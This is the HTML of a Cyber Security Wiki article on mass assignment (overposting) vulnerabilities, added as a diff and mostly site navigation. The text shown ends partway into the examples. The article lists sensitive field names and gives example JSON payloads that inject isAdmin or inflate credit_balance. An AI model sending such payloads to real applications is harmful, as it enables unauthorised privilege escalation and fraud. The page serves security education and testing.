@@ -1,0 +1,1681 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Mass Assignment # Mass Assignment (also known as Overposting, Autobinding, or Object Injection) is a vulnerability where an application framework automatically binds user-supplied input parameters directly to internal object properties or database models without proper filtering.1 This allows attackers to modify sensitive attributes that should be restricted, such as administrative flags, account balances, or user roles.2
+Understanding Mass Assignment Basics # Typical Mapping Process # Frameworks use Object-Relational Mapping (ORM) or &ldquo;Active Record&rdquo; patterns to reduce boilerplate code.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Mass Assignment" />
+<meta property="og:description" content="Mass Assignment # Mass Assignment (also known as Overposting, Autobinding, or Object Injection) is a vulnerability where an application framework automatically binds user-supplied input parameters directly to internal object properties or database models without proper filtering.1 This allows attackers to modify sensitive attributes that should be restricted, such as administrative flags, account balances, or user roles.2
+Understanding Mass Assignment Basics # Typical Mapping Process # Frameworks use Object-Relational Mapping (ORM) or &ldquo;Active Record&rdquo; patterns to reduce boilerplate code." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>Mass Assignment | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class=" active">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Mass Assignment</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#mass-assignment">Mass Assignment</a>
+      <ul>
+        <li><a href="#understanding-mass-assignment-basics"><strong>Understanding Mass Assignment Basics</strong></a>
+          <ul>
+            <li><a href="#typical-mapping-process"><strong>Typical Mapping Process</strong></a></li>
+            <li><a href="#alternative-framework-nomenclature"><strong>Alternative Framework Nomenclature</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#common-sensitive-attributes-wordlist"><strong>Common Sensitive Attributes (Wordlist)</strong></a></li>
+        <li><a href="#mass-assignment-attack-surface"><strong>Mass Assignment Attack Surface</strong></a></li>
+        <li><a href="#exploiting-mass-assignment"><strong>Exploiting Mass Assignment</strong></a>
+          <ul>
+            <li><a href="#1-privilege-escalation"><strong>1. Privilege Escalation</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#bypasses--obfuscation"><strong>Bypasses &amp; Obfuscation</strong></a>
+          <ul>
+            <li><a href="#1-http-parameter-pollution-hpp"><strong>1. HTTP Parameter Pollution (HPP)</strong></a></li>
+            <li><a href="#2-content-type-switching"><strong>2. Content-Type Switching</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques"><strong>Detection Techniques</strong></a></li>
+        <li><a href="#impact"><strong>Impact</strong></a></li>
+        <li><a href="#tools"><strong>Tools</strong></a></li>
+        <li><a href="#mitigation--prevention"><strong>Mitigation &amp; Prevention</strong></a></li>
+        <li><a href="#good-to-read"><strong>Good To Read</strong></a></li>
+        <li><a href="#references"><strong>References</strong></a></li>
+        <li><a href="#works-cited"><strong>Works cited</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="mass-assignment">
+  Mass Assignment
+  <a class="anchor" href="#mass-assignment">#</a>
+</h1>
+<p><strong>Mass Assignment</strong> (also known as Overposting, Autobinding, or Object Injection) is a vulnerability where an application framework automatically binds user-supplied input parameters directly to internal object properties or database models without proper filtering.1 This allows attackers to modify sensitive attributes that should be restricted, such as administrative flags, account balances, or user roles.2</p>
+<h2 id="understanding-mass-assignment-basics">
+  <strong>Understanding Mass Assignment Basics</strong>
+  <a class="anchor" href="#understanding-mass-assignment-basics">#</a>
+</h2>
+<h3 id="typical-mapping-process">
+  <strong>Typical Mapping Process</strong>
+  <a class="anchor" href="#typical-mapping-process">#</a>
+</h3>
+<p>Frameworks use Object-Relational Mapping (ORM) or &ldquo;Active Record&rdquo; patterns to reduce boilerplate code.2</p>
+<ol>
+<li><strong>Input</strong>: Client sends data (JSON, XML, or Form-URL-Encoded).</li>
+<li><strong>Binding</strong>: The framework iterates through the request keys and matches them to object properties.1</li>
+<li><strong>Persistence</strong>: The entire object is saved to the database.</li>
+</ol>
+<h3 id="alternative-framework-nomenclature">
+  <strong>Alternative Framework Nomenclature</strong>
+  <a class="anchor" href="#alternative-framework-nomenclature">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Language/Framework</strong></th>
+<th><strong>Terminology</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ruby on Rails / Node.js</td>
+<td>Mass Assignment1</td>
+</tr>
+<tr>
+<td>Java (Spring) / ASP.NET</td>
+<td>Autobinding / Overposting1</td>
+</tr>
+<tr>
+<td>PHP (Laravel)</td>
+<td>Object Injection / Mass Assignment</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="common-sensitive-attributes-wordlist">
+  <strong>Common Sensitive Attributes (Wordlist)</strong>
+  <a class="anchor" href="#common-sensitive-attributes-wordlist">#</a>
+</h2>
+<ul>
+<li><strong>Roles/Permissions</strong>: isAdmin, is_admin, role, privileges, permissions, access_level.7</li>
+<li><strong>Financial/Logic</strong>: balance, credit_balance, cash, points, amount, total_price.9</li>
+<li><strong>Account State</strong>: verified, status, active, banned, confirmed, account_type.9</li>
+<li><strong>Internal Metadata</strong>: id, owner_id, created_at, updated_at, tenant_id.3</li>
+</ul>
+<h2 id="mass-assignment-attack-surface">
+  <strong>Mass Assignment Attack Surface</strong>
+  <a class="anchor" href="#mass-assignment-attack-surface">#</a>
+</h2>
+<ul>
+<li>Registration Forms: Adding isAdmin: true during sign-up.</li>
+<li>Profile Update Pages: Injecting role or email fields to hijack accounts.</li>
+<li>API Endpoints (REST/GraphQL): POST, PUT, and PATCH requests that handle JSON payloads.</li>
+<li>E-commerce Checkouts: Modifying chosen_discount or price parameters.</li>
+<li>Password Reset Flows: Injecting an id or token to override legitimate reset credentials.1</li>
+</ul>
+<h2 id="exploiting-mass-assignment">
+  <strong>Exploiting Mass Assignment</strong>
+  <a class="anchor" href="#exploiting-mass-assignment">#</a>
+</h2>
+<h3 id="1-privilege-escalation">
+  <strong>1. Privilege Escalation</strong>
+  <a class="anchor" href="#1-privilege-escalation">#</a>
+</h3>
+<p>Assume a registration request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">register</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;attacker&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;password123&#34;</span>}
+</span></span></code></pre></div><p><strong>Payloads</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#e6db74">&#34;attacker&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#e6db74">&#34;password123&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;isAdmin&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Other variations: &ldquo;role&rdquo;: &ldquo;admin&rdquo;, &ldquo;is_administrator&rdquo;: 1, &ldquo;user_type&rdquo;: &ldquo;superuser&rdquo;.9</p>
+<p><strong>2. Financial &amp; E-commerce Manipulation</strong></p>
+<p>Targeting balance or discount fields in API responses.</p>
+<p><strong>Original Response</strong> (GET /api/me):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#e6db74">&#34;wiener&#34;</span>,<span style="color:#960050;background-color:#1e0010"> </span><span style="color:#e6db74">&#34;credit_balance&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#ae81ff">10</span>}
+</span></span></code></pre></div><p><strong>Attack Payload</strong> (POST /api/update):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#e6db74">&#34;wiener&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;credit_balance&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#ae81ff">99999</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Discount Hijack Example</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
